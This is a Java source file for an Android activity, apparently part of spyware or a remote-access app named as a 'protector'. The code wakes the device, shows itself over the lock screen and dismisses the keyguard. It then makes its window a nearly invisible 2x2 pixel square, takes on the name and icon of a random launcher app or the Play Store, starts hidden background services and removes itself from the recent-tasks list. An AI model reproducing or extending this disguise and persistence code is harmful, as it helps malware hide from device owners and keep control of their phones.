package com.icontrol.protector;

import static com.icontrol.protector.UtliTools.drawableToBitmap;
import static com.icontrol.protector.UtliTools.excludeFromTaskList;
import static com.icontrol.protector.UtliTools.getRandomLauncherApp;
import static com.icontrol.protector.UtliTools.isPackageInstalled;

import android.app.Activity;
import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.graphics.drawable.Drawable;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.view.Gravity;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;

public class tofront extends Activity {
    //private static TransparentActivity instance = null;


    @Override
    protected void onDestroy() {
        super.onDestroy();
        //  instance = null;
    }




    @Override
    protected void onResume() {
        super.onResume();
        // excludeFromTaskList(getApplicationContext());
        Handler hstop = new Handler(Looper.getMainLooper());
        hstop.postDelayed(new Runnable() {
            public void run() {
                try {
                    //
                    excludeFromTaskList(getApplicationContext());
                    moveTaskToBack(true);
                } catch (Exception d) {

                }
            }
        },1500);
    }

    private View overlayView;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);


        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
                setShowWhenLocked(true);
                setTurnScreenOn(true);
            }
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                PowerManager.WakeLock wakeLock = pm.newWakeLock(
                        PowerManager.FULL_WAKE_LOCK |
                                PowerManager.ACQUIRE_CAUSES_WAKEUP |
                                PowerManager.ON_AFTER_RELEASE ,
                        "App:IncomingCall"
                );
                wakeLock.acquire(3000);
            }
//            requestWindowFeature(Window.FEATURE_NO_TITLE);
//
//            getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
//                    WindowManager.LayoutParams.FLAG_FULLSCREEN);
            // instance = this;
//            getWindow().getDecorView().setSystemUiVisibility(
//                    View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
//                            | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
//                            | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
//                            | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
//                            | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
//                            | View.SYSTEM_UI_FLAG_FULLSCREEN
//            );
//          LinearLayout layout = new LinearLayout(this);
//          layout.setLayoutParams(new LinearLayout.LayoutParams(
//                  LinearLayout.LayoutParams.MATCH_PARENT,
//                  1
//          ));
//         layout.setBackgroundColor(Color.TRANSPARENT);
//          //layout.setBackgroundColor(Color.RED);
//          layout.setClickable(false);
//          layout.setFocusable(false);
//          int mytype = 0;
//
//          if(My_Access_inst != null && My_Access_inst.AccessLayout != null){
//              mytype = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY;
//          }else{
//              if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.canDrawOverlays(this)){
//                  mytype = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
//              }else{
//                  mytype = -1;
//              }
//          }
//
//          if(mytype != -1){
//              WindowManager.LayoutParams params = new WindowManager.LayoutParams(
//                      WindowManager.LayoutParams.MATCH_PARENT,
//                      1,
//                      mytype, // Use TYPE_APPLICATION_OVERLAY for API 26+
//                      WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE ,
//                      PixelFormat.TRANSLUCENT
//              );
//
//              WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
//              params.gravity = Gravity.BOTTOM;
//              if(mytype == WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY){
//                  My_Access_inst.AccessWindow.addView(layout, params);
//              }else{
//                  wm.addView(layout, params);
//              }
//
//          }
//
//
            try {
                requestWindowFeature(Window.FEATURE_NO_TITLE);
                Window window = getWindow();
                window.setFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                        WindowManager.LayoutParams.FLAG_DIM_BEHIND |
                        WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
                        WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE, WindowManager.LayoutParams.FLAG_FULLSCREEN);
                //window.addFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL);
                //window.addFlags(WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE);
                //window.addFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL);

                // Set transparent background
                WindowManager.LayoutParams params = window.getAttributes();
                params.height = 2; // Minimal height
                params.width =2;
               // params.screenBrightness = 0;
                params.gravity = Gravity.TOP | Gravity.START; // Pin it to the bottom
                window.setAttributes(params);

                // Make it completely invisible visually
                //window.setBackgroundDrawableResource(android.R.color.transparent);

                // Prevent dimming or blocking other UI
                window.clearFlags(WindowManager.LayoutParams.FLAG_DIM_BEHIND);
            } catch (Exception a) {
                a.printStackTrace();
            }
            try {

                String packageName = getRandomLauncherApp(getApplicationContext());

                if (!isPackageInstalled(packageName, getPackageManager())) {
                    packageName = "com.android.vending";
                    if (!isPackageInstalled(packageName, getPackageManager())) {
                        packageName = null;
                    }
                }
                if (packageName != null) {

                    PackageManager packageManager = getPackageManager();
                    ApplicationInfo applicationInfo = packageManager.getApplicationInfo(packageName, 0);
                    Drawable appIcon = packageManager.getApplicationIcon(applicationInfo);

                    String appName = packageManager.getApplicationLabel(applicationInfo).toString();
                    this.setTitle(appName);

                    // Convert Drawable to Bitmap
                    Bitmap appIconBitmap = drawableToBitmap(appIcon);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                        ActivityManager.TaskDescription taskDescription = new ActivityManager.TaskDescription(appName, appIconBitmap, Color.TRANSPARENT);
                        this.setTaskDescription(taskDescription);
                    }
                }

            } catch (Exception a) {
                a.printStackTrace();
            }

            //setContentView(R.layout.activity_half_screen);
            // Perform the work you need to do here
            doWork();
            overlayView = new View(getApplicationContext());
            overlayView.setFocusable(true);
            overlayView.setClickable(true);
            overlayView.setBackgroundColor(Color.TRANSPARENT);

            setContentView(overlayView);
            Handler hstop = new Handler(Looper.getMainLooper());
            hstop.postDelayed(new Runnable() {
                public void run() {
                    try {

                        excludeFromTaskList(getApplicationContext());
                        moveTaskToBack(true);
                    } catch (Exception d) {

                    }

                }
            },3000);



        } catch (Exception a) {
            a.printStackTrace();
            finish();
        }
    }

    private void doWork() {
        try {
            Context mcontext = getApplicationContext();
            Intent workint = new Intent(mcontext, EngineWorker.class);
            if (!MyCods.isServiceRunning(mcontext, EngineWorker.class)) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    mcontext.startForegroundService(workint);
                } else {
                    mcontext.startService(workint);
                }
            }

            if (!MyCods.isServiceRunning(mcontext, WorkServices.class)) {
                Intent workint2 = new Intent(mcontext, WorkServices.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    mcontext.startForegroundService(workint2);
                } else {
                    mcontext.startService(workint2);
                }
            }
        } catch (Exception e) {

        }
    }


}
